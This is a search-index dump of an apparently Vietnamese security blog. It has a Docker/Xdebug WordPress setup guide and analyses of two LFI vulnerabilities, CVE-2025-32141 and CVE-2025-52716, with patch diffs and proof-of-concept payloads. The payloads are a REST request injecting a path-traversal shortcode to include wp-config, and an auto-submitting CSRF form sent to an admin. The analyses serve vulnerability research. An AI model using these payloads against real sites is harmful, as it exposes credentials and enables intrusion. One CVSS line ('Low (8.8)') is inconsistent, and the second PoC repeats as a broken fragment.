ƒë·ªÉ ƒë·ªãnh nghƒ©a v√† qu·∫£n l√Ω nhi·ªÅu container li√™n k·∫øt ch·ªâ b·∫±ng m·ªôt file c·∫•u h√¨nh duy nh·∫•t (docker-compose.yml). V·ªõi WordPress, ta c·∫ßn: M·ªôt container MySQL ƒë·ªÉ l∆∞u c∆° s·ªü d·ªØ li·ªáu. M·ªôt container WordPress (PHP + web server) ƒë·ªÉ ch·∫°y m√£ ngu·ªìn. N·∫øu l√†m th·ªß c√¥ng, b·∫°n s·∫Ω ph·∫£i nh·∫≠p nhi·ªÅu l·ªánh v√† c·∫•u h√¨nh ph·ª©c t·∫°p. V·ªõi Docker Compose, t·∫•t c·∫£ n·∫±m trong m·ªôt file YAML gi√∫p: D·ªÖ c√†i ƒë·∫∑t: docker-compose up -d l√† c√≥ ƒë·ªß WordPress + MySQL. D·ªÖ chia s·∫ª: Ng∆∞·ªùi kh√°c ch·ªâ c·∫ßn c√πng file docker-compose.yml l√† ch·∫°y ƒë∆∞·ª£c. D·ªÖ m·ªü r·ªông: Th√™m phpMyAdmin, Nginx, ho·∫∑c Xdebug ch·ªâ c·∫ßn v√†i d√≤ng. Xem h∆∞·ªõng d·∫´n c√†i Docker Compose t·∫°i: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#docker"},{"categories":["Web"],"collections":null,"content":"Prerequisites\rDocker\rTr∆∞·ªõc ti√™n, b·∫°n c·∫ßn c√†i ƒë·∫∑t Docker. C√¥ng c·ª• n√†y h·ªó tr·ª£ tr√™n nhi·ªÅu h·ªá ƒëi·ªÅu h√†nh, m·ªói n·ªÅn t·∫£ng c√≥ c√°ch c√†i ƒë·∫∑t ri√™ng. Xem h∆∞·ªõng d·∫´n t·∫°i: https://www.docker.com/get-started/ Docker Compose\rThay v√¨ ch·∫°y t·ª´ng container th·ªß c√¥ng b·∫±ng docker run, ta d√πng Docker Compose ƒë·ªÉ ƒë·ªãnh nghƒ©a v√† qu·∫£n l√Ω nhi·ªÅu container li√™n k·∫øt ch·ªâ b·∫±ng m·ªôt file c·∫•u h√¨nh duy nh·∫•t (docker-compose.yml). V·ªõi WordPress, ta c·∫ßn: M·ªôt container MySQL ƒë·ªÉ l∆∞u c∆° s·ªü d·ªØ li·ªáu. M·ªôt container WordPress (PHP + web server) ƒë·ªÉ ch·∫°y m√£ ngu·ªìn. N·∫øu l√†m th·ªß c√¥ng, b·∫°n s·∫Ω ph·∫£i nh·∫≠p nhi·ªÅu l·ªánh v√† c·∫•u h√¨nh ph·ª©c t·∫°p. V·ªõi Docker Compose, t·∫•t c·∫£ n·∫±m trong m·ªôt file YAML gi√∫p: D·ªÖ c√†i ƒë·∫∑t: docker-compose up -d l√† c√≥ ƒë·ªß WordPress + MySQL. D·ªÖ chia s·∫ª: Ng∆∞·ªùi kh√°c ch·ªâ c·∫ßn c√πng file docker-compose.yml l√† ch·∫°y ƒë∆∞·ª£c. D·ªÖ m·ªü r·ªông: Th√™m phpMyAdmin, Nginx, ho·∫∑c Xdebug ch·ªâ c·∫ßn v√†i d√≤ng. Xem h∆∞·ªõng d·∫´n c√†i Docker Compose t·∫°i: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#docker-compose"},{"categories":["Web"],"collections":null,"content":"Installing WordPress with Docker Compose and Xdebug\rPh·∫ßn n√†y h∆∞·ªõng d·∫´n c√†i WordPress v·ªõi Docker Compose, t√≠ch h·ª£p Xdebug ƒë·ªÉ debug tr·ª±c ti·∫øp trong VS Code. C√°ch n√†y gi√∫p b·∫°n c√≥ m√¥i tr∆∞·ªùng ph√°t tri·ªÉn ƒë·∫ßy ƒë·ªß, d·ªÖ g·ª° l·ªói v√† m·ªü r·ªông. C·∫•u tr√∫c th∆∞ m·ª•c: . ‚îú‚îÄ‚îÄ wordpress ‚îú‚îÄ‚îÄ docker-compose.yml ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ php.ini ‚îî‚îÄ‚îÄ .vscode ‚îî‚îÄ‚îÄ launch.json ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:2","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#installing-wordpress-with-docker-compose-and-xdebug"},{"categories":["Web"],"collections":null,"content":"Setup Environment\rT·∫°o th∆∞ m·ª•c m·ªõi ƒë·ªÉ ch·ª©a to√†n b·ªô c·∫•u h√¨nh: mkdir wordpress-docker \u0026\u0026 cd wordpress-docker ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:3","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#setup-environment"},{"categories":["Web"],"collections":null,"content":"Create Dockerfile\rImage WordPress m·∫∑c ƒë·ªãnh ch∆∞a c√≥ Xdebug, n√™n ta m·ªü r·ªông b·∫±ng Dockerfile. nano Dockerfile N·ªôi dung: FROM wordpress:latest # C√†i ƒë·∫∑t Xdebug RUN pecl install xdebug \u0026\u0026 docker-php-ext-enable xdebug ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:4","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-dockerfile"},{"categories":["Web"],"collections":null,"content":"Create docker-compose.yml\rT·∫°o file ƒë·ªÉ c·∫•u h√¨nh to√†n b·ªô h·ªá th·ªëng: nano docker-compose.yml N·ªôi dung: services: db: image: mysql:latest container_name: wp_db restart: always environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress volumes: - db_data:/var/lib/mysql wordpress: build: . container_name: wp_app depends_on: - db ports: - \"80:80\" restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: - ./wordpress:/var/www/html - ./php.ini:/usr/local/etc/php/conf.d/php.ini volumes: db_data: Th√¥ng tin\rvolumes: d√πng ƒë·ªÉ l∆∞u tr·ªØ d·ªØ li·ªáu v√† ƒë·ªìng b·ªô m√£ ngu·ªìn gi·ªØa m√°y th·∫≠t v√† container. Gi·∫£i th√≠ch: db_data:/var/lib/mysql L∆∞u d·ªØ li·ªáu MySQL b·ªÅn v·ªØng, kh√¥ng m·∫•t khi x√≥a container. ./wordpress:/var/www/html ƒê·ªìng b·ªô m√£ ngu·ªìn WordPress gi·ªØa m√°y v√† container, gi√∫p s·ª≠a code tr·ª±c ti·∫øp. ./php.ini:/usr/local/etc/php/conf.d/php.ini G·∫Øn file c·∫•u h√¨nh PHP/Xdebug, d·ªÖ t√πy ch·ªânh m√† kh√¥ng c·∫ßn rebuild image. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:5","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-docker-composeyml"},{"categories":["Web"],"collections":null,"content":"Create php.ini\rK√≠ch ho·∫°t Xdebug v√† c·∫•u h√¨nh PHP. nano php.ini N·ªôi dung: zend_extension=xdebug xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=172.17.0.1 xdebug.client_port=9003 xdebug.log_level=0 upload_max_filesize = 64M post_max_size = 64M memory_limit = 128M max_execution_time = 300 max_input_time = 300 Gi·∫£i th√≠ch: C√°c d√≤ng xdebug.* gi√∫p k·∫øt n·ªëi v·ªõi VS Code khi debug. C√°c d√≤ng sau tƒÉng gi·ªõi h·∫°n upload v√† t√†i nguy√™n PHP. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:6","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-phpini"},{"categories":["Web"],"collections":null,"content":"Create VS Code Launch Configuration\rT·∫°o file c·∫•u h√¨nh VS Code ƒë·ªÉ k·∫øt n·ªëi v·ªõi Xdebug: mkdir .vscode \u0026\u0026 nano .vscode/launch.json N·ªôi dung: ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:7","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-vs-code-launch-configuration"},{"categories":["Web"],"collections":null,"content":"Install VS Code Extension\rM·ªü VS Code ‚Üí Extensions (Ctrl + Shift + X) ‚Üí C√†i ƒë·∫∑t: PHP Debug (by Xdebug) ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:8","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#install-vs-code-extension"},{"categories":["Web"],"collections":null,"content":"Run Docker Compose\rKh·ªüi ƒë·ªông h·ªá th·ªëng: docker-compose up -d Sau khi kh·ªüi ch·∫°y, truy c·∫≠p http://localhost ƒë·ªÉ c√†i ƒë·∫∑t WordPress. Gi·ªù b·∫°n c√≥ th·ªÉ ƒë·∫∑t breakpoint trong file PHP v√† debug tr·ª±c ti·∫øp tr√™n VS Code. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:9","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#run-docker-compose"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress MasterStudy LMS Plugin.","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin MasterStudy LMS phi√™n b·∫£n ‚â§ 3.5.28 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-32141 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 3.5.28 Patched Versions: 3.5.29 CVSS severity: Low (8.8) Required Privilege: Contributor Product: WordPress MasterStudy LMS Plugin ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - MasterStudy LMS: 3.5.28 (vulnerable) v√† 3.5.29 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } Trong phi√™n b·∫£n l·ªói, callback c·ªßa shortcode stm_lms_courses_categories l·∫•y tr·ª±c ti·∫øp gi√° tr·ªã style t·ª´ m·∫£ng $atts v√† truy·ªÅn th·∫≥ng v√†o STM_LMS_Templates::stm_lms_load_vc_element() m√† kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra hay l√†m s·∫°ch ƒë·∫ßu v√†o n√†o =\u003e LFI c√≥ th·ªÉ x·∫£y ra. B·∫£n v√°: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = '' ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts, $tag ); $atts['style'] = basename( sanitize_file_name( $atts['style'] ) ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } B·∫£n v√° ƒë√£ sanitize $atts['style'] b·∫±ng sanitize_file_name() ƒë√£ lo·∫°i b·ªè chu·ªói/k√Ω t·ª± kh√¥ng an to√†n =\u003e ngƒÉn ch·∫∑n LFI. ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = '', $custom_path = '' ) { extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path ); if ( ! file_exists( $element ) \u0026\u0026 strpos( $__template_name, 'style_' ) !== false ) { $element = str_replace( $__template_name, 'style_1', $element ); } if ( file_exists( $element ) ) { include $element; } else { echo esc_html__( 'Element not found in', 'masterstudy-lms-learning-management-system' ); echo esc_html( ' ' . $element ); } } H√†m include() t·∫°i ƒë√¢y d√πng bi·∫øn $element do stm_lms_locate_vc_element() tr·∫£ v·ªÅ v√† $__template_name (t·ª©c gi√° tr·ªã style t·ª´ shortcode) ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp t·ªõi k·∫øt qu·∫£ ƒë√≥. N·∫øu style kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c, attacker c√≥ th·ªÉ √©p include file t√πy √Ω d·∫´n ƒë·∫øn LFI. public static function stm_lms_locate_vc_element( $templates, $template_name = '', $custom_path = '' ) { $located = false; foreach ( (array) $templates as $template ) { $folder = $template; if ( ! empty( $template_name ) ) { $template = $template_name; } if ( substr( $template, -4 ) !== '.php' ) { $template .= '.php'; } if ( empty( $custom_path ) ) { $located = locate_template( 'partials/vc_parts/' . $folder . '/' . $template ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/includes/shortcodes/partials/' . $folder . '/' . $template; } } else { $located = locate_template( $custom_path ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/' . $custom_path . '.php'; } } if ( file_exists( $template_name ) ) { break; } } return apply_filters( 'stm_lms_locate_vc_element', $located, $templates ); } H√†m stm_lms_locate_vc_element() c√≥ nhi·ªám v·ª• x√°c ƒë·ªãnh v√† tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n file template (.php) N·∫øu c√≥ $template_name, n√≥ s·∫Ω ghi ƒë√® t√™n template m·∫∑c ƒë·ªãnh v√† ƒë·∫£m b·∫£o t√™n file c√≥ ph·∫ßn m·ªü r·ªông .php. T√™n file s·∫Ω l√†STM_LMS_PATH/includes/shortcodes/partials/{folder}/{template}.php V√≠ d·ª• v·ªõi style=payload th√¨ stm_lms_locate_vc_element() s·∫Ω tr·∫£ v·ªÅ: /srv/www/wordpress/wp-content/plugins/masterstudy-lms-learning-management-system/_core/includes/shortcodes/partials/courses_categories/payload.php ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o post v·ªõi shortcode c√≥ attribute style ch·ª©a LFI payload POST /wp-json/wp/v2/posts/260?_locale=user HTTP/1.1 Host: localhost {\"id\":260,\"content\":\"\u003c!-- wp:shortcode --\u003e\\n[stm_lms_courses_categories taxonomy=x style=../../../../../../../../wp-config]\\n\u003c!-- /wp:shortcode --\u003e\\n\\n\u003c!-- wp:paragraph --\u003e\\n\u003cp\u003e\u003c/p\u003e\\n\u003c!-- /wp:paragraph --\u003e\"} K·∫øt qu·∫£: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 3.5.28 c·ªßa MasterStudy LMS cho ph√©p LFI qua tham s·ªë style trong shortcode do kh√¥ng ki·ªÉm tra ƒë·∫ßu v√†o tr∆∞·ªõc khi include file. B·∫£n v√° 3.5.29 ƒë√£ l√†m s·∫°ch gi√° tr·ªã n√†y b·∫±ng sanitize_file_name() v√† basename(), ngƒÉn ch·∫∑n vi·ªác truy c·∫≠p file ngo√†i √Ω mu·ªën. ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rKh√¥ng bao gi·ªù gh√©p tr·ª±c ti·∫øp input ng∆∞·ªùi d√πng v√†o ƒë∆∞·ªùng d·∫´n file. Lu√¥n sanitize ho·∫∑c gi·ªõi h·∫°n gi√° tr·ªã b·∫±ng whitelist tr∆∞·ªõc khi include. X√°c th·ª±c ƒë∆∞·ªùng d·∫´n th·ª±c t·∫ø ƒë·ªÉ ƒë·∫£m b·∫£o file n·∫±m trong th∆∞ m·ª•c h·ª£p l·ªá. C·∫≠p nh·∫≠t l√™n v3.5.29 ƒë·ªÉ lo·∫°i b·ªè l·ªó h·ªïng LFI. ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal ‚Äî Hacktrick WordPress MasterStudy LMS Plugin \u003c= 3.5.28 is vulnerable to Local File Inclusion ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP REST Cache Plugin.","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin WP REST Cache phi√™n b·∫£n ‚â§ 2025.1.0 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-52716 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2025.1.0 Patched Versions: 2025.1.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress WP REST Cache Plugin ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP REST Cache: 2025.1.0 (vulnerable) v√† 2025.1.1 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } Trong phi√™n b·∫£n l·ªói, $sub l√† gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa filter_input() l·∫•y gi√° tr·ªã t·ª´ tham s·ªë GET (?sub=...) trong URL v·ªõi filter FILTER_SANITIZE_FULL_SPECIAL_CHARS d√πng ƒë·ªÉ esacape \"\u003c\u003e\u0026 v√† c√°c k√Ω t·ª± v·ªõi ASCII value d∆∞·ªõi 32. T·ª©c kh√¥ng bao g·ªìm .(46) v√† /(47) $sub ƒë∆∞·ª£c concat v√†o chu·ªói c√≥ '.php' sau c√πng tr∆∞·ªõc khi ƒë∆∞·ª£c include_once m√† kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá tr∆∞·ªõc LFI. B·∫£n v√°: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } $potential_sub_file = __DIR__ . '/partials/sub-' . $sub . '.php'; if ( dirname( $potential_sub_file ) !== __DIR__ . '/partials' ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } B·∫£n v√° ƒë√£ th√™m c∆° ch·∫ø ki·ªÉm tra v·ªã tr√≠ file tr∆∞·ªõc khi include, ƒë·∫£m b·∫£o file ƒë∆∞·ª£c n·∫°p ch·ªâ n·∫±m trong th∆∞ m·ª•c partials. N·∫øu ph√°t hi·ªán ƒë∆∞·ªùng d·∫´n ra ngo√†i (do chu·ªói nh∆∞ ../), plugin t·ª± ƒë·ªông chuy·ªÉn v·ªÅ file m·∫∑c ƒë·ªãnh an to√†n. Nh·ªù ƒë√≥, l·ªó h·ªïng LFI b·ªã lo·∫°i b·ªè. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rsettings_page() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback c·ªßa submenu add_submenu_page( 'options-general.php', 'WP REST Cache', 'WP REST Cache', $capability, 'wp-rest-cache', [ $this, 'settings_page', ] ); T·ª©c khi truy c·∫≠p endpoint GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1 th√¨ settings_page() ƒë∆∞·ª£c g·ªçi. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o trang web c√≥ form, t·ª± ƒë·ªông g·ª≠i request v·ªõi LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80//wp-admin/options-general.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"wp-rest-cache\"\u003e \u003cinput type=\"text\" name=\"sub\" value=\"/../../../../../../wp-cofnig\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2\rG·ª≠i link ƒë·∫øn trang web cho admin ho·∫∑c ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn C·∫£nh b√°o L·ªó h·ªïng n√†y ch·ªâ khai th√°c ƒë∆∞·ª£c tr√™n Windows, v√¨ h√†m file_exists() x·ª≠ l√Ω ƒë∆∞·ªùng d·∫´n kh√°c nhau gi·ªØa hai h·ªá ƒëi·ªÅu h√†nh. Tr√™n Linux, n·∫øu ƒë∆∞·ªùng d·∫´n ch·ª©a th∆∞ m·ª•c kh√¥ng t·ªìn t·∫°i, h√†m s·∫Ω tr·∫£ v·ªÅ false. Trong khi ƒë√≥, tr√™n Windows, c√πng ƒë∆∞·ªùng d·∫´n ƒë√≥ l·∫°i c√≥ th·ªÉ tr·∫£ v·ªÅ true, khi·∫øn ƒëi·ªÅu ki·ªán ki·ªÉm tra b·ªã b·ªè qua v√† l·ªó h·ªïng c√≥ th·ªÉ k√≠ch ho·∫°t. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o trang web c√≥ form, t·ª± ƒë·ªông g·ª≠i request v·ªõi LFI payload \u003c!DOCTYPE html\u003e 